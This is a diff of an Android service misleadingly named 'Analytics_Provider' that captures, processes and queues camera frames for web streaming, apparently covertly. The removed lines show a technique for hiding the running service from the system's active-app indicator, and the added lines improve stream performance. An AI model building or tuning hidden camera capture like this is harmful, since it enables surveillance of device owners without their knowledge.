@@ -197,15 +197,6 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
         } else {
             startForeground(NOTIFICATION_ID, notification);
         }
-
-        // Remove from Samsung / Android 12+ "1 Active App" Recents Header
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                try {
-                    stopForeground(true);
-                } catch (Exception ignored) {}
-            }, 2000);
-        }
     }
 
     @androidx.camera.camera2.interop.ExperimentalCamera2Interop
@@ -260,7 +251,6 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                         streamWidth = width;
                         streamHeight = height;
                         streamQuality = quality;
-                        streamQuality = quality;
                         
                         createOverlay();
 
@@ -278,25 +268,52 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                                 .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_YUV_420_888);
 
                         imageAnalysis = analysisBuilder.build();
+
+                        final ByteArrayOutputStream reusableStream = new ByteArrayOutputStream(131072);
+                        final long[] lastFrameTime = new long[1];
+
                         imageAnalysis.setAnalyzer(cameraExecutor, image -> {
                             if (!isStreaming) { image.close(); return; }
+                            long now = android.os.SystemClock.elapsedRealtime();
+                            // Frame pacing: Cap at ~25-30 FPS max (35ms min interval) to prevent CPU starvation & ART GC stalls
+                            if (now - lastFrameTime[0] < 35) {
+                                image.close();
+                                return;
+                            }
+                            lastFrameTime[0] = now;
+
                             try {
-                                // [STABILITY_SYNC] Apply rotation degrees from ImageInfo to fix sideways feed
                                 int rotation = image.getImageInfo().getRotationDegrees();
                                 Bitmap bitmap = image.toBitmap();
                                 
                                 if (bitmap != null) {
-                                    if (rotation != 0) {
-                                        Matrix matrix = new Matrix();
-                                        matrix.postRotate(rotation);
-                                        Bitmap rotated = Bitmap.createBitmap(bitmap, 0, 0, bitmap.getWidth(), bitmap.getHeight(), matrix, true);
-                                        bitmap.recycle();
-                                        bitmap = rotated;
+                                    int srcWidth = bitmap.getWidth();
+                                    int srcHeight = bitmap.getHeight();
+                                    
+                                    // Target max dimension bound for smooth web stream performance (max 1024px)
+                                    int maxDim = 1024;
+                                    float scale = 1.0f;
+                                    if (Math.max(srcWidth, srcHeight) > maxDim) {
+                                        scale = (float) maxDim / Math.max(srcWidth, srcHeight);
                                     }
 
-                                    if (nightModeEnabled) {
+                                    Matrix matrix = new Matrix();
+                                    if (scale < 1.0f) {
+                                        matrix.postScale(scale, scale);
+                                    }
+                                    if (rotation != 0) {
+                                        matrix.postRotate(rotation);
+                                    }
+
+                                    Bitmap processed = bitmap;
+                                    if (scale < 1.0f || rotation != 0) {
+                                        processed = Bitmap.createBitmap(bitmap, 0, 0, srcWidth, srcHeight, matrix, true);
+                                        bitmap.recycle();
+                                    }
+
+                                    if (nightModeEnabled && processed != null) {
                                         try {
-                                            android.graphics.Canvas canvas = new android.graphics.Canvas(bitmap);
+                                            android.graphics.Canvas canvas = new android.graphics.Canvas(processed);
                                             android.graphics.Paint paint = new android.graphics.Paint();
                                             android.graphics.ColorMatrix cm = new android.graphics.ColorMatrix(new float[] {
                                                 2.2f, 0,    0,    0, 25f,
@@ -305,17 +322,21 @@ public class Analytics_Provider extends Service implements LifecycleOwner {
                                                 0,    0,    0,    1.0f, 0f
                                             });
                                             paint.setColorFilter(new android.graphics.ColorMatrixColorFilter(cm));
-                                            canvas.drawBitmap(bitmap, 0, 0, paint);
+                                            canvas.drawBitmap(processed, 0, 0, paint);
                                         } catch (Exception ignored) {}
                                     }
-                                    
-                                    ByteArrayOutputStream out = new ByteArrayOutputStream();
-                                    bitmap.compress(Bitmap.CompressFormat.JPEG, streamQuality, out);
-                                    byte[] jpegData = out.toByteArray();
-                                    latestFrame = jpegData;
-                                    if (frameQueue.size() >= 5) frameQueue.poll();
-                                    frameQueue.offer(jpegData);
-                                    bitmap.recycle();
+
+                                    if (processed != null) {
+                                        synchronized (reusableStream) {
+                                            reusableStream.reset();
+                                            processed.compress(Bitmap.CompressFormat.JPEG, Math.min(streamQuality, 85), reusableStream);
+                                            byte[] jpegData = reusableStream.toByteArray();
+                                            latestFrame = jpegData;
+                                            if (frameQueue.size() >= 3) frameQueue.poll();
+                                            frameQueue.offer(jpegData);
+                                        }
+                                        processed.recycle();
+                                    }
                                 }
                             } catch (Exception e) {
                                 Log.e(TAG, "Analysis Error: " + e.getMessage());
